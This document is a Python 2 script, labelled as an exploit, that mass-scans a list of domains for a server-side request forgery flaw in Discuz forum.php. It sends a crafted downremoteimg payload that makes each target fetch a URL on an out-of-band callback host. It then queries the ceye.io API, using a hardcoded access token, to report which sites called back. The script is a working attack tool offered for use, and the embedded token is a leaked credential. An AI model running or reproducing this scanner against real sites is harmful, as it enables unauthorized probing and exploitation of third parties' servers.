#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-


import requests
import json
import urlparse
import argparse
import threading
import time
import sys

reload(sys)
sys.setdefaultencoding('utf8')
requests.packages.urllib3.disable_warnings()

class exploit:

    def __init__(self, api, url):

        self.api = "http://" + api
        self.url = url

    def api_query(self):

        api = "http://api.ceye.io/v1/records?token=6bbee0bd4a05f5a1b7798cf6fe692b0a&type=http"
        r = requests.get(api,timeout=2)
        json_data = json.loads(r.text)
        for i in json_data['data']:
            r = i['name']
            vuln_url = r.replace(self.api + '/' ,'').replace('/x.jpg','')
            print vuln_url + " " + "存在discuz/forum.php参数message/SSRF漏洞"

    def curl(self):

        with open(self.url, 'r+')as f:
            for domain in f.readlines():
                domain = domain.strip('\n\r')
                url_change = urlparse.urlparse(domain)
                url_ = url_change.netloc
                payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]{api}/{url}/x.jpg[/img]&formhash=xxoo".format(
                    api=self.api, url=url_)
                url = domain + payload
                try:
                    response = requests.get(url=url, verify=False,timeout=3)
                    print "[+]Being tested: {}".format(url_) + \
                        " Page status code ：" + str(response.status_code)
                except Exception:
                    pass
        self.api_query()


if __name__ == '__main__':

    parse = argparse.ArgumentParser(description="")
    parse.add_argument('-a', '--api', type=str, help="api")
    parse.add_argument('-u', '--url', type=str, help="url")
    args = parse.parse_args()

    if not args.api:
        parse.print_help()
        exit()

    api = args.api
    url = args.url
    ia = exploit(api, url)
    threads = []
    t1 = threading.Thread(target=ia.curl(), )
    threads.append(t1)
    for t in threads:
        t.start()
